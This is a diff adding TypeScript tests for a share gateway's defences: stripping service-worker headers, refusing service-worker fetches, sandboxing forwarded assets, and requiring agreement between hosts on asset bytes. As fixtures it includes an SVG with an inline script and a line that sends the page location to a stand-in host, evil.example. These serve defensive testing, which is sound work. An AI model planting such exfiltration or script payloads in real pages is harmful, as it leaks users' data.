@@ -835,3 +835,136 @@ test("a gathering's photos hop as the link's own: the upload's body passes once,
   assert.deepEqual([small.status, small.body.length], [200, 10]);
   assert.equal((await get(`${g.base}/api/h/${T("h")}/img/1`)).status, 503, "declared over the cap");
 });
+
+// ---- the shared share origin: no service worker, no foreign asset bytes (sec-share-origin) --------
+
+test("a hop's answer never carries Service-Worker-Allowed or Clear-Site-Data; its own other headers still pass", async () => {
+  const o = await origin((_q, res) => {
+    res.writeHead(200, { "Content-Type": "application/json", "Service-Worker-Allowed": "/", "Clear-Site-Data": '"*"', "Content-Security-Policy": "default-src 'self'" });
+    res.end("{}");
+  });
+  const g = await gateway({ port: o.port, links: [row(T("k"))] });
+  for (const path of [`/api/h/${T("k")}`, `/h/${T("k")}`]) {
+    const r = await get(`${g.base}${path}`);
+    assert.equal(r.status, 200, path);
+    assert.equal(r.headers["service-worker-allowed"], undefined, path);
+    assert.equal(r.headers["clear-site-data"], undefined, path);
+    assert.equal(r.headers["content-security-policy"], "default-src 'self'", "the minting host keeps its CSP");
+  }
+});
+
+test("a service-worker script fetch is 404 at the edge on every share route and socket, never hopped; plain fetches still pass", async () => {
+  const o = await origin((req, res) => {
+    if (req.url?.startsWith("/h/assets/")) return void res.writeHead(200, { "Content-Type": "text/javascript" }).end("self.onfetch = () => {}");
+    res.writeHead(200, { "Content-Type": "text/javascript", "Service-Worker-Allowed": "/" }).end("self.onfetch = () => {}");
+  });
+  const g = await gateway({ port: o.port, links: [row(T("k"))], assets: ["x.js"] });
+  const sw = { "Service-Worker": "script" };
+  for (const path of [`/api/h/${T("k")}`, `/h/${T("k")}`, "/h/assets/x.js", `/api/h/${T("u")}`, `/h/${T("u")}`]) {
+    const r = await get(`${g.base}${path}`, { headers: sw });
+    assert.equal(r.status, 404, path);
+    assert.equal(r.headers["content-type"], "application/json", path);
+  }
+  assert.equal(o.seen.length, 0, "nothing reached the routed host");
+  assert.deepEqual(g.dials, []);
+  const w = await new Promise<number>((resolve) => {
+    const ws = new WebSocket(`ws://127.0.0.1:${g.port}/ws/h?token=${T("k")}`, { headers: sw });
+    ws.once("unexpected-response", (_q, res) => resolve(res.statusCode ?? 0));
+    ws.once("open", () => {
+      ws.close();
+      resolve(101);
+    });
+    ws.once("error", () => resolve(0));
+  });
+  assert.equal(w, 404, "a socket upgrade with the header too");
+  assert.equal((await get(`${g.base}/api/h/${T("k")}`)).status, 200, "the same fetch without the header hops as before");
+  assert.equal((await get(`${g.base}/h/assets/x.js`)).status, 200);
+});
+
+test("a preview host is untouched by the service-worker refusal: its own app may register one", async () => {
+  const seen: (string | undefined)[] = [];
+  const server = createShareServer({
+    dispatch: (_q, res) => void res.writeHead(200).end("share"),
+    upgrade: (_q, socket) => void socket.destroy(),
+    client: (req) => req.socket.remoteAddress ?? "unknown",
+    preview: {
+      match: (req) => (req.headers.host === "app.preview.test" ? "app" : null),
+      dispatch: (req, res) => {
+        seen.push(req.headers["service-worker"] as string | undefined);
+        res.writeHead(200, { "Content-Type": "text/javascript", "Service-Worker-Allowed": "/" }).end("// sw");
+      },
+      upgrade: (_q, socket) => void socket.destroy(),
+    },
+  });
+  const port = await listen(server);
+  const r = await get(`http://127.0.0.1:${port}/sw.js`, { headers: { Host: "app.preview.test", "Service-Worker": "script" } });
+  assert.deepEqual([r.status, r.body, r.headers["service-worker-allowed"]], [200, "// sw", "/"]);
+  assert.deepEqual(seen, ["script"]);
+});
+
+test("a forwarded asset carries a sandbox CSP, so it runs nothing opened as a page; the frame host keeps its own", async () => {
+  const o = await origin((req, res) => {
+    if (req.url === "/h/assets/a.js") return void res.writeHead(200, { "Content-Length": "14" }).end("console.log(1)");
+    if (req.url === "/h/assets/i.svg") return void res.writeHead(200).end("<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>");
+    if (req.url === `/h/assets/${FRAME_HOST_NAME}`) return void res.writeHead(200).end("<!doctype html>");
+    res.writeHead(404).end();
+  });
+  const g = await gateway({ port: o.port, assets: ["a.js", "i.svg", FRAME_HOST_NAME] });
+  for (const name of ["a.js", "i.svg"]) {
+    const r = await get(`${g.base}/h/assets/${name}`);
+    assert.equal(r.status, 200, name);
+    assert.equal(r.headers["content-security-policy"], "sandbox; default-src 'none'", name);
+  }
+  assert.equal((await get(`${g.base}/h/assets/${FRAME_HOST_NAME}`)).headers["content-security-policy"], FRAME_HOST_CSP);
+});
+
+/** A gateway whose two peers (n1, n2) both listed `assets`, each at its own loopback ingress. */
+async function twoListers(port1: number, port2: number, assets: string[]) {
+  const peers: PeerEntry[] = [PEER, { id: "c", nodeId: "n2", label: "c", dnsName: "c.unresolvable.invalid" }];
+  const g = await gateway({ port: port1, assets, peers, resolve: async () => "127.0.0.1" });
+  g.reg.commit("n2", { v: 1, seq: 1, links: [], assets, ingressPort: port2 }, GATEWAY.publicUrl, { now: Date.now(), local: new Set(), live: () => true });
+  return g;
+}
+
+test("a name two live hosts listed: served only once both answered the same bytes; differing bytes are 503", async () => {
+  const bodies1: Record<string, string> = { "/h/assets/same.js": "export const a = 1;", "/h/assets/diff.js": "export const real = 1;" };
+  const bodies2: Record<string, string> = { "/h/assets/same.js": "export const a = 1;", "/h/assets/diff.js": "fetch('https://evil.example/' + location)" };
+  let down2 = false;
+  const answer = (bodies: Record<string, string>) => (req: IncomingMessage, res: ServerResponse) => {
+    const b = bodies[req.url!];
+    if (!b) return void res.writeHead(404).end();
+    res.writeHead(200, { "Content-Length": String(Buffer.byteLength(b)) }).end(b);
+  };
+  const o1 = await origin(answer(bodies1));
+  const o2 = await origin((req, res) => (down2 ? void res.socket?.destroy() : answer(bodies2)(req, res)));
+  const g = await twoListers(o1.port, o2.port, ["same.js", "diff.js"]);
+  const same = await get(`${g.base}/h/assets/same.js`);
+  assert.deepEqual([same.status, same.body, same.headers["content-type"]], [200, "export const a = 1;", "text/javascript; charset=utf-8"]);
+  assert.equal(same.headers["content-security-policy"], "sandbox; default-src 'none'");
+  assert.ok(o1.seen.some((s) => s.url === "/h/assets/same.js") && o2.seen.some((s) => s.url === "/h/assets/same.js"), "both listers were asked");
+  const diff = await get(`${g.base}/h/assets/diff.js`);
+  assert.equal(diff.status, 503, "differing bytes are never served, whichever lister came first");
+  assert.ok(!diff.body.includes("evil") && !diff.body.includes("real"));
+  // Once agreed, one lister going down doesn't take the asset with it; one that changes its bytes
+  // is never served.
+  down2 = true;
+  assert.equal((await get(`${g.base}/h/assets/same.js`)).body, "export const a = 1;");
+  down2 = false;
+  bodies1["/h/assets/same.js"] = "alert(1)";
+  const swapped = await get(`${g.base}/h/assets/same.js`);
+  assert.deepEqual([swapped.status, swapped.body], [200, "export const a = 1;"], "the other lister's agreed bytes");
+  bodies2["/h/assets/same.js"] = "alert(1)";
+  assert.equal((await get(`${g.base}/h/assets/same.js`)).status, 503, "no lister answers the agreed bytes any more");
+});
+
+test("a name two live hosts listed is 503 until every lister has answered; the frame host stays first-lister", async () => {
+  const doc = "<!doctype html><p>frame</p>";
+  const o1 = await origin((req, res) => {
+    if (req.url === `/h/assets/${FRAME_HOST_NAME}`) return void res.writeHead(200).end(doc);
+    res.writeHead(200).end("export const a = 1;");
+  });
+  const g = await twoListers(o1.port, await deadPort(), ["one.js", FRAME_HOST_NAME]);
+  assert.equal((await get(`${g.base}/h/assets/one.js`)).status, 503, "a lister that never answered: no agreement yet");
+  const frame = await get(`${g.base}/h/assets/${FRAME_HOST_NAME}`);
+  assert.deepEqual([frame.status, frame.body, frame.headers["content-security-policy"]], [200, doc, FRAME_HOST_CSP]);
+});
